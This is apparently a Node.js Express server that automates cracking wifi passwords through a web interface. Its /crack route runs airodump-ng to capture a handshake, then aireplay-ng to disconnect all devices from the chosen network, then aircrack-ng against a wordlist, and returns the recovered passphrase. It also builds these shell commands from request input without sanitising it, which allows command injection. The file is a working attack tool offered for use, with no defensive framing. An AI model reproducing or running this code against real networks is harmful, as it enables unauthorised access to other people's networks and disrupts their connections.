const express = require('express')
var iwlist = require('wireless-tools/iwlist');
const path = require('path');
const { exec } = require("child_process");

const INTERFACE_1 = 'wlx00c0ca970255'
const INTERFACE_2 = 'wlan0mon'
const TARGET_MAC = 'b6:79:f6:88:d3:c0'
const PORT = 3000

const app = express()
app.use(express.json())

let wifiList = []
let selectedWifi = {}

app.use('/images', express.static(__dirname + '/images'));

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, '/index.html'));
})

app.get('/networks', async(req, res) => {
    console.log('Scanning for wifis ...')
    iwlist.scan(INTERFACE_1, function(err, networks) {
        wifiList = networks
        res.json(wifiList)
    });
})

app.post('/crack', async(req, res) => {
    selectedWifi = wifiList.filter(wifi => wifi.address === req.body.address)[0];
    console.log('Starting attack on following target :')
    console.log(selectedWifi)

    exec(`airmon-ng start wlx00c0ca970255 ${INTERFACE_1}\n airodump-ng -c ${selectedWifi.channel} --bssid ${selectedWifi.address} -w psk ${INTERFACE_2}`, (error, stdout, stderr) => {
        console.log(`stdout: ${stdout}`);
    });

    setTimeout(() => {
        console.log("disconnecting all devices")
        exec(`aireplay-ng -0 1 -a ${selectedWifi.address} ${INTERFACE_2}`, (error, stdout, stderr) => {
            console.log(`stdout: ${stdout}`);
        });
    }, 10000);

    setTimeout(() => {
        console.log(`Running : aircrack-ng -w dico.txt -b ${selectedWifi.address} psk*.cap`)
        exec(`aircrack-ng -w dico.txt -b ${selectedWifi.address} psk*.cap`, (error, stdout, stderr) => {
            let array = stdout.split('\n')
            let secondArray = array.filter(x => {
                return x.includes('passphrase')
            })
            const password = secondArray[0].split(':')[1].replace(/\s/g, '')
            console.log('WIFI PASSWORD : ', password)
            res.json({ password })
        });
    }, 20000);

})

app.listen(PORT, () => {
    console.log(`Example app listening on port ${PORT}`)
})